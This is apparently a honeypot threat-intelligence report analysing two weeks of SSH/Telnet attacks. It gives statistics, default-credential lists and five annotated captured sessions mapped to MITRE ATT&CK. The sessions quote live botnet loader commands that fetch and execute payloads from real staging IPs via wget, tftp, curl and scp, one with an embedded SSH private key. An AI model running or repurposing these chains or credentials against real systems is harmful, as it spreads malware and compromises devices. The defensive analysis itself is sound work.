# I ran a real SSH/Telnet honeypot on the open internet for two weeks. Here's what attacked it.

*Collection window: Aug 20 - Sep 3, 2026 (14 days, in two parts — see the
limitation below).*

## What I built

Provisioned a VPS via Terraform (DigitalOcean, firewall managed as code),
deployed [Cowrie](https://github.com/cowrie/cowrie) (fake SSH/Telnet) via
Docker Compose, and wired a GitHub Actions pipeline that redeploys the
honeypot config on every push to `main`. Logs are shipped off-box daily to
a private git branch so a compromised container can't destroy its own
evidence. Repo: [`rvasan1310/honeypot-threat-intel`](https://github.com/rvasan1310/honeypot-threat-intel).

## Known limitation: no post-auth command data for the Aug 20 - Sep 1 window

A misconfiguration in `cowrie.cfg` (three keys pointed at bundled-resource
paths that don't exist in the `cowrie/cowrie:latest` image) crashed every
single session immediately after a successful login, before the attacker
ever reached a shell. That means the connection/credential numbers below
are solid, but there is **zero post-auth command data for Aug 20 - Sep 1**
— no malware staging, no recon commands, no miner drops observed, because
none were ever captured, not because attackers didn't attempt them. Found
and fixed same-day (commit `a638b86`); real command data started arriving
within minutes of the fix going live, and the "Concrete stories" section
below is built from that fresh data.

## The numbers

Pulled from `analysis/output/summary.json`, combining both parts of the
window (Aug 20 - Sep 1 pre-fix, Sep 1 20:20 UTC - Sep 3 17:06 UTC post-fix):

- Total events logged: **187,701**
- Total connection attempts: **36,669**
- Unique sessions: **36,692**
- Unique source IPs: **2,581**
- Successful logins: **17,330**
- Failed logins: **21,729**
- Post-auth commands captured: **5,488** (all from the post-fix portion —
  zero from Aug 20 - Sep 1, see limitation above)
- File download attempts captured: **117** successful, **112** explicitly
  failed/timed out (see Story 5)
- Top credential pairs tried: *(see chart)*

![Top credentials](../output/top_credentials.png)
![Connections per day](../output/connections_per_day.png)
![Command categories](../output/command_categories.png)

*Country breakdown isn't included this round — it requires a MaxMind
GeoLite2 DB and the `--geoip` flag isn't wired up yet.*

The two most-tried pairs — `enable\x00`/`linuxshell\x00` (2,804 attempts)
and `system\x00`/`shell\x00` (2,756 attempts) — dwarf everything else and
carry trailing null bytes, a fingerprint of raw Telnet-negotiation scanner
tools rather than manual attempts; this is almost certainly one or two
automated botnet scanners hammering the telnet listener. Further down the
list, `root/xc3511` (286) and `root/vizxv` (218) are the original Mirai
botnet's hardcoded default-credential list for IP cameras and DVRs —
nearly a decade old and still in active use by scanners today. The rest
(`admin/admin`, `root/admin`, `support/support`, `root/123456`) are
generic router/appliance default-credential guesses, consistent with
broad, untargeted IoT credential stuffing rather than anything aimed at
this host specifically.

Of the 5,488 post-auth commands, **3,767 were the single command**
`uname -a 2>/dev/null || echo 'Unknown'` — one hyperactive recon script
alone accounts for over two-thirds of all command volume in the dataset.
The categorized breakdown (`analysis/output/command_categories.png`)
splits the rest into recon (3,888 total), malware-staging (137), and
uncategorized (1,463) — no cryptominer command-line indicators
(`xmrig`, `stratum+tcp`, etc.) showed up in this window.

## Concrete stories

The Aug 20 - Sep 1 window has none — see the limitation above. The fix
went live on 2026-09-01 at ~20:20 UTC, and real post-auth command data
started arriving within minutes. Stories 1-3 are from the first few hours
post-fix; Stories 4-5 are from a second pass through Sep 2-3 data (pulled
directly from the VPS's live log at collection cutoff, a few hours ahead
of that day's nightly shipment to the `logs` branch). Every command,
session ID, and timestamp below is real.

### Story 1: A Gafgyt/Bashlite loader chain, live end to end

Session `876599c4878b` from `200.59.122.158` logged in with `admin/admin`
at `2026-09-01T22:30:42Z` and ran, in order:

```
enable / system / shell / sh / linuxshell / enablelinuxshell
ping ;sh
echo -e "\x47\x41\x59\x46\x47\x54"          # decodes to "GAYFGT"
cd /proc && cat self/cmdline
>/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/
>/var/d && chmod 777 /var/d && /var/d && cd /var/
   ... (repeated across /var/tmp, /var/run, /dev, /dev/shm, /data,
        /etc, /mnt, /usr, /home, /root — 12 mount points total)
(wget http://185.93.89.72/wget -O- || busybox wget ...) > w; chmod 777 w; ./w; rm -rf w
(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp ...) > t; chmod 777 t; ./t; rm -rf t
(ftpget 185.93.89.72 f ftpget || busybox ftpget ...) > f; chmod 777 f; ./f; rm -rf f
```

The whole session lasted 44 seconds. The shell-fingerprint variants
(`enable`, `system`, `shell`, `sh`...) and the hex string are textbook
**Gafgyt/Bashlite** (aka Lizkebab/Torlus) behavior — `\x47\x41\x59\x46\x47\x54`
decodes to `GAYFGT`, a known Gafgyt shell-liveness check echoed between
every staging step. After confirming a writable+executable directory, it
fell back through three separate fetchers (`wget` → `tftp` → `ftpget`,
each with a `busybox` fallback) all pointing at the same IP,
`185.93.89.72` — which is itself one of the source IPs attacking this
honeypot (see Story 2). Maps to **T1082** (System Information Discovery,
the `/proc/cmdline` read and writable-dir probing) and **T1105** (Ingress
Tool Transfer, the three-stage download attempt).

### Story 2: The payload host attacks under its own name, seconds later

Session `789eddd09253` from `185.93.89.72` — the same IP Story 1's bot
tried to fetch a payload from — logged in with `admin/admin` just 2
seconds after Story 1's session started (`2026-09-01T22:30:44Z`), ran the
same shell-fingerprint sequence with a shorter `GAY` variant of the hex
check, then:

```
echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon   # writes/reads/deletes "kami/dev"
rm /dev/.t; rm /dev/.sh; rm /dev/.human     # deleting files it didn't create this session
cd /dev/
cp /bin/echo dvrHelper; >dvrHelper; chmod 777 dvrHelper; echo -e "\x47\x41\x59"
cat /bin/echo
```

`rm /dev/.t; rm /dev/.sh; rm /dev/.human` reads as one bot clearing marker
files a *different* malware family would have left behind — competing
IoT botnets are known to evict each other from the same device. `dvrHelper`
is a recognizable filename from real DVR/NVR-targeting Mirai-family
malware; here it's just `/bin/echo` copied under that name, a cheap
write+execute-permission test before a real binary would be dropped in
its place. Session closed after 6 seconds. Maps to **T1105** (staging a
binary under a malware-associated filename) and arguably **T1070**
(Indicator Removal, if the `rm` calls are in fact clearing a rival's
artifacts rather than its own).

### Story 3: One IP, four credentials, one fingerprint routine

`104.194.10.16` opened four separate sessions over 27 minutes, cycling
through `admin/admin`, `root/anko`, `root/54321`, and `root/default`, each
running the identical sequence `enable → linuxshell → system → shell → sh
→ /bin/busybox UNSTABLE`, each command spaced ~4-6 seconds apart within a
session. `busybox UNSTABLE` is a deliberately-invalid BusyBox applet name
— it fails, but the failure banner reveals the BusyBox build and target
architecture, which a botnet uses to pick the right malware binary for
the device. Consistent timing and command order across all four sessions
indicates a scripted client working down a credential list rather than a
human. Maps to **T1592** (Gather Victim Host Information) and **T1110**
(Brute Force, across the four credential attempts from one source).

### Story 4: A self-propagating bot carrying its own SSH key ("RedTail")

Three separate sessions — `ad3545ba027c` (`130.12.180.51`, Sep 2 00:19:17Z),
`887cef40f3af` (`154.127.69.0`, Sep 3 05:20:16Z), and `ecf613af8c1b`
(`130.12.180.51` again, Sep 3 08:30:07Z) — all logged in with `admin/admin`
and ran the same payload, one as a single semicolon-chained line and one
typed out across many individual `command.input` events:

```
uname -a; echo -e "\x61\x75\x74\x68\x5f\x6f\x6b\x0a"          # decodes to "auth_ok\n"
cd /tmp || cd /var/tmp || cd /dev/shm
echo '-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ
0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg
AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9
Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=
-----END OPENSSH PRIVATE KEY-----' > key.ppk
echo 'StrictHostKeyChecking no
UserKnownHostsFile /dev/null' > sshcfg
chmod 400 key.ppk
scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh
if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1
else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s ssh
fi
rm -rf sshcfg key.ppk out_sh
echo -e "\x72\x65\x64\x74\x61\x69\x6c\x5f\x62\x6f\x74\x5f\x74\x65\x6c\x6e\x65\x74\x5f\x6f\x6b"   # decodes to "redtail_bot_telnet_ok"
```

This is a self-propagating bot carrying its own **embedded ED25519 SSH
private key**, used as a *client* credential to `scp` its next stage
(a file named `sh`) from a staging box at `217.60.195.113` under the
hardcoded username `dlr`, falling back to HTTPS `wget`/`curl` if `scp`
fails. The two hex-encoded beacon strings — `auth_ok` after confirming
shell access, and `redtail_bot_telnet_ok` after staging — are success
callbacks, and the second one **names the bot family outright**:
**RedTail**, a real, publicly-documented IoT/SSH cryptojacking botnet.
Three independent source IPs running byte-for-byte the same script is
strong evidence of one botnet's infrastructure, not three separate
attackers. Maps to **T1552.004** (Private Keys — the malware carries and
uses its own SSH key as an operational credential) and **T1105**
(Ingress Tool Transfer via the scp/wget/curl fallback chain).

### Story 5: A six-architecture loader that all failed, cleanly logged

Session `7701ecda56a1` from `85.219.201.2` (`root/Zxic521`, Sep 3
00:36:17Z) — one of six near-identical sessions from the same IP over 15
minutes, cycling through different stolen-looking credentials — ran the
same 9-directory writable-probe pattern as Story 1/3
(`/bin/busybox echo > X/.b && sh X/.b && cd X/` across `/tmp`, `/var`,
`/var/run`, `/var/tmp`, `/dev`, `/dev/shm`, `/etc`, `/mnt`, `/usr`,
`/boot`, `/home`, twice through), set its hostname with
`/bin/busybox hostname TOASTER`, then tried to fetch six
architecture-named binaries from one host, first over HTTP then TFTP:

```
/bin/busybox wget http://45.150.195.235/tmips  -O - > .a && chmod 777 .a && ./.a telnet.wget
/bin/busybox wget http://45.150.195.235/tmpsl  -O - > .a && chmod 777 .a && ./.a telnet.wget
/bin/busybox wget http://45.150.195.235/tarm   -O - > .a && chmod 777 .a && ./.a telnet.wget
/bin/busybox wget http://45.150.195.235/tarm5  -O - > .a && chmod 777 .a && ./.a telnet.wget
/bin/busybox wget http://45.150.195.235/tarm6  -O - > .a && chmod 777 .a && ./.a telnet.wget
/bin/busybox wget http://45.150.195.235/tarm7  -O - > .a && chmod 777 .a && ./.a telnet.wget
   ... then the identical six again via `busybox tftp -g <ip> -r <name> -l .a`
```

The filenames (`tmips`, `tmpsl`, `tarm`, `tarm5/6/7`) are per-architecture
binary names (MIPS, SuperH/SH, ARM variants) — standard IoT-botnet
practice of shotgunning every common embedded CPU architecture since the
attacker doesn't know the target's arch in advance. What makes this one
citable rather than just plausible: Cowrie's `cowrie.session.file_download.failed`
events show it *genuinely tried* every one of these 12 fetches and logged
exactly why each failed — the six HTTP attempts failed outright, and the
six TFTP fallbacks each logged `TFTP: Transfer timed out`, roughly 15
seconds apart, meaning the honeypot's outbound network path was working
but `45.150.195.235` itself was unreachable at that moment. (A separate
set of 11 `cowrie.session.file_download` *successes* in this same session
all share the identical hash `01ba4719c8...aca546b` — that's just
`sha256("\n")`, an artifact of the earlier `.b` write-probes, not a real
payload; worth knowing so a future pass doesn't mistake it for downloaded
malware.) Maps to **T1595** (Active Scanning / architecture fingerprinting
via shotgun-fetch) and **T1105** (Ingress Tool Transfer, attempted).

## MITRE ATT&CK mapping observed

| Behavior | Technique | Observed? |
|---|---|---|
| Password brute forcing | T1110 Brute Force | Yes — 21,729 failed attempts total + Story 3 |
| Successful login w/ guessed creds | T1078 Valid Accounts | Yes — 17,330 total |
| Commands run post-login | T1059 Command and Scripting Interpreter | Yes — 5,488 events, all post-fix |
| Recon / device fingerprinting | T1082 / T1592 / T1595 | Yes — Stories 1, 3, 5; 3,888 recon-classified commands |
| File download attempts (wget/tftp/ftpget/scp) | T1105 Ingress Tool Transfer | Yes — Stories 1, 2, 4, 5 (117 succeeded, 112 explicitly failed) |
| Malware carrying its own auth credential | T1552.004 Private Keys | Yes — Story 4 (embedded SSH key) |
| Possible rival-malware cleanup | T1070 Indicator Removal | Plausible — Story 2 |
| Cryptominer indicators | T1496 Resource Hijacking | Not observed — no `xmrig`/`stratum` strings in 5,488 commands |

## What I'd do differently / next steps

- [x] Re-run collection now that the post-auth capture bug is fixed —
      done, command data confirmed flowing within minutes of the fix
- [x] Let the fixed collector run for a few more days and re-run
      `parse_logs.py` for command-category charts and more stories —
      done; cut short deliberately at ~2.5 days post-fix rather than the
      full week, since attacker behavior repeats fast (same credential
      lists, same botnet scripts) and returns were already diminishing
- [ ] Wire up `--geoip` with a MaxMind GeoLite2 DB for the country breakdown
- [ ] Add a health check that catches "container up but every session
      dying pre-shell" — the Docker healthcheck only checked the port was
      listening, which stayed true throughout this entire bug
- [ ] Add a second honeypot type (Conpot for ICS/SCADA flavor)
- [ ] Correlate source IPs against known botnet / C2 IP lists — start with
      the IOCs from Stories 4-5: `217.60.195.113` (RedTail's scp/https
      staging host, hardcoded user `dlr`) and `45.150.195.235` (the
      six-architecture loader host from Story 5)
- [ ] Longer collection window to see if credential lists rotate over time

## Repo

Terraform, Compose config, CI/CD pipeline, and analysis scripts (logs and
secrets scrubbed): [`rvasan1310/honeypot-threat-intel`](https://github.com/rvasan1310/honeypot-threat-intel)
